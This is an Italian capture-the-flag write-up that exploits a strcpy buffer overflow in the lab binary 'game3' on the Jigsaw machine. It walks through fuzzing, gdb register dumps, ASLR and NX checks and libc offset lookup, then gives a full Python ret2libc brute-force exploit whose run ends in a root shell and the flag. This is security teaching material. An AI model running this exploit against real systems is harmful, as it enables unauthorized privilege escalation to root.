Sembrerebbe che il codice operi un controllo sull'input e poi passi l'input ARGV[1] a strcpy.
Scriviamo un semplice script bash per testare velocemente quando il programma va in crash, anche se da un primo sguardo il valore dovrebbe essere verosimilmente vicino a 80.

```
 8048453:       83 ec 50                sub    $0x50,%esp 
```


Passiamo a verificarlo :


```
for i in {1..100};do export i; input=$(python -c 'import os;print ("A" * int(os.environ["i"]))');./game3 $input;echo $i;done;

```

Otteniamo l'errore di segmentazione al carattere 76.
Come mostrato sotto :


![Schermata da 2019-08-25 05-53-29](https://user-images.githubusercontent.com/54471416/63648358-c45d0700-c6fc-11e9-931a-a8666460f420.png)


Tramite gdb verifichiamo che iniettando in input 80 caratteri riusciamo a ottenere la sovrascittura del registro %EIP (instruction pointer) e %EBP (base pointer).
Come possiamo vedere sotto :


```
root@kali:~/Jigsaw# gdb --args ./game3 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+ gdb --args ./game3 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
GNU gdb (Debian 8.1-4) 8.1
Copyright (C) 2018 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from ./game3...(no debugging symbols found)...done.
(gdb) run
Starting program: /root/Jigsaw/game3 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
(gdb) ir
Undefined command: "ir".  Try "help".
(gdb) i r
eax            0xffe008b0	-2094928
ecx            0xffe01580	-2091648
edx            0xffe008fa	-2094854
ebx            0x0	0
esp            0xffe00900	0xffe00900
ebp            0x41414141	0x41414141
esi            0xf7f5d000	-134885376
edi            0xf7f5d000	-134885376
eip            0x41414141	0x41414141
eflags         0x10202	[ IF RF ]
cs             0x23	35
ss             0x2b	43
ds             0x2b	43
es             0x2b	43
fs             0x0	0
gs             0x63	99
```


Per avere visivamente un layout piu' chiaro, distinguiamo con altri 2 caratteri l'input passato all'eseguibile.




```
root@kali:~/Jigsaw# gdb --args ./game3 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCC
+ gdb --args ./game3 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCC
GNU gdb (Debian 8.1-4) 8.1
Copyright (C) 2018 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from ./game3...(no debugging symbols found)...done.
(gdb) run
Starting program: /root/Jigsaw/game3 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCC

Program received signal SIGSEGV, Segmentation fault.
0x43434343 in ?? ()
(gdb) i r
eax            0xff96ae30	-6902224
ecx            0xff96b580	-6900352
edx            0xff96ae74	-6902156
ebx            0x0	0
esp            0xff96ae80	0xff96ae80
ebp            0x42424242	0x42424242
esi            0xf7eff000	-135270400
edi            0xf7eff000	-135270400
eip            0x43434343	0x43434343
eflags         0x10202	[ IF RF ]
cs             0x23	35
ss             0x2b	43
ds             0x2b	43
es             0x2b	43
fs             0x0	0
gs             0x63	99
```


A questo punto saremmo pronti per un attacco buffer overflow classico.
Ma verifichiamo se sono in atto meccanismi di sicurezza sulla macchina target.

```
jigsaw@jigsaw:~$ cat /proc/sys/kernel/randomize_va_space 
2
jigsaw@jigsaw:~$ ldd /bin/game3 
	linux-gate.so.1 =>  (0xb76e3000)
	libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7526000)
	/lib/ld-linux.so.2 (0xb76e5000)
jigsaw@jigsaw:~$ ldd /bin/game3 
	linux-gate.so.1 =>  (0xb77bf000)
	libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7602000)
	/lib/ld-linux.so.2 (0xb77c1000)
jigsaw@jigsaw:~$ ldd /bin/game3 
	linux-gate.so.1 =>  (0xb773a000)
	libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb757d000)
	/lib/ld-linux.so.2 (0xb773c000)
```


Riscontriamo che e' attivo l'ASLR con livello 2, con la sua randomizzazione degli indirizzi base di stack,heap e librerie condivise, come possiamo vedere sopra.


```
jigsaw@jigsaw:~$ dmesg | grep "NX (Execute Disable)"
[    0.000000] NX (Execute Disable) protection: active
jigsaw@jigsaw:~$ cat /proc/cpuinfo | grep nx
flags		: fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush mmx fxsr sse sse2 ht nx rdtscp constant_tsc xtopology nonstop_tsc pni pclmulqdq monitor ssse3 cx16 sse4_1 sse4_2 x2apic movbe popcnt aes xsave avx rdrand hypervisor lahf_lm abm 3dnowprefetch fsgsbase avx2 invpcid rdseed clflushopt flush_l1d
```


Riscontriamo che e' inoltre attiva la protezione NX , come possiamo notare sopra.
In questo caso, non e' quindi possibile applicare il sistema classico di exploit per il buffer overflow, ma dobbiamo procedere in modo tale da raggirare prima le protezioni applicate dalla macchina.

Il metodo piu' semplice per provare a bypassare entrambi e' con un bruteforce dell' indirizzo di base della libc.
Dai risultati sopra vediamo che la parte variabile degli indirizzi e' al massimo di 12 bit, quindi circa 4096 possibilita'.
Troviamo a questo punto, gli offset per le funzioni che ci interessano, ad esempio system() e exit() .

```
jigsaw@jigsaw:~$ readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system
   243: 0011b8a0    73 FUNC    GLOBAL DEFAULT   12 svcerr_systemerr@@GLIBC_2.0
   620: 00040310    56 FUNC    GLOBAL DEFAULT   12 __libc_system@@GLIBC_PRIVATE
  1443: 00040310    56 FUNC    WEAK   DEFAULT   12 system@@GLIBC_2.0
jigsaw@jigsaw:~$ readelf -s /lib/i386-linux-gnu/libc.so.6 | grep exit
   111: 00033690    58 FUNC    GLOBAL DEFAULT   12 __cxa_at_quick_exit@@GLIBC_2.10
   139: 00033260    45 FUNC    GLOBAL DEFAULT   12 exit@@GLIBC_2.0
   446: 000336d0   268 FUNC    GLOBAL DEFAULT   12 __cxa_thread_atexit_impl@@GLIBC_2.18
   554: 000b8634    24 FUNC    GLOBAL DEFAULT   12 _exit@@GLIBC_2.0
   609: 0011e780    56 FUNC    GLOBAL DEFAULT   12 svc_exit@@GLIBC_2.0
   645: 00033660    45 FUNC    GLOBAL DEFAULT   12 quick_exit@@GLIBC_2.10
   868: 00033490    84 FUNC    GLOBAL DEFAULT   12 __cxa_atexit@@GLIBC_2.1.3
  1037: 00128ce0    60 FUNC    GLOBAL DEFAULT   12 atexit@GLIBC_2.0
  1380: 001ad204     4 OBJECT  GLOBAL DEFAULT   31 argp_err_exit_status@@GLIBC_2.1
  1492: 000fb610    62 FUNC    GLOBAL DEFAULT   12 pthread_exit@@GLIBC_2.0
  2090: 001ad154     4 OBJECT  GLOBAL DEFAULT   31 obstack_exit_failure@@GLIBC_2.0
  2243: 00033290    77 FUNC    WEAK   DEFAULT   12 on_exit@@GLIBC_2.0
  2386: 000fc180     2 FUNC    GLOBAL DEFAULT   12 __cyg_profile_func_exit@@GLIBC_2.2
```




A questo punto passiamo a trovare i parametri da passare alla funzione system.
Cercando una delle shell possibili, per esempio /bin/bash o sh utilizzabili all'interno dell'eseguibile con il comando sotto :

```
hexdump -C /bin/game3 | grep sh
```

Oppure possiamo scomodare la libc stessa.

```
hexdump -C /lib/i386-linux-gnu/libc.so.6 | grep sh
```


Troviamo alcuni spunti validi, tra i quali scegliamo quello sotto, preso dalla libc del target :


```
00164cd0  6e 2f 63 73 68 00 77 2b  63 65 00 2f 64 65 76 2f  |n/csh.w+ce./dev/|
```




Sostituiamo i valori degli offset e delle basi trovate.




```
#exp.py
#!/usr/bin/env python
import struct
from subprocess import call

libc_base_addr = 0xb757d000
exit_off = 0x00033260             
system_off = 0x00040310           
system_addr = libc_base_addr + system_off
exit_addr = libc_base_addr + exit_off
system_arg = libc_base_addr + 0x00164cd3

#endianess convertion
def conv(num):
 return struct.pack("<I",num)

# Junk + system + exit + system_arg
buf = "A" * 76
buf += conv(system_addr)
buf += conv(exit_addr)
buf += conv(system_arg)

print "Calling vulnerable program"
#Multiple tries until we get lucky
i = 0
while (i < 4096):
 print "Number of tries: %d" %i
 i += 1
 ret = call(["/bin/game3", buf])
 if (not ret):
  break
 else:
  print "Exploit failed"
```


Proviamo adesso a eseguire lo script sopra, sulla macchina target :

```
jigsaw@jigsaw:~$ ./exp.py 
Calling vulnerable program
Number of tries: 0
Exploit failed
Number of tries: 1
Exploit failed
Number of tries: 2
Exploit failed
Number of tries: 3
Exploit failed
Number of tries: 4
Exploit failed
Number of tries: 5
Exploit failed
Number of tries: 6
Exploit failed
Number of tries: 7
Exploit failed
Number of tries: 8
Exploit failed
Number of tries: 9
Exploit failed
Number of tries: 10
Exploit failed

...


Number of tries: 40
Exploit failed
Number of tries: 41
Exploit failed
Number of tries: 42
Exploit failed
Number of tries: 43
Exploit failed
Number of tries: 44
# id
uid=1000(jigsaw) gid=1000(jigsaw) euid=0(root) groups=0(root),1000(jigsaw)
# pwd
/home/jigsaw
# 
```

Bingo! Siamo dentro come root.
Troviamo la flag adesso.


```
# ls -l /root
total 4
-rw-r--r-- 1 root root 53 May 10 04:41 gameover.txt
# cat /root/gameover.txt
Congrats!

flag3{3a4e24a20ad52afef48852b613da483a}


# 
```






Walter Messina - phan2sec@gmail.com

Freecircle Security Team
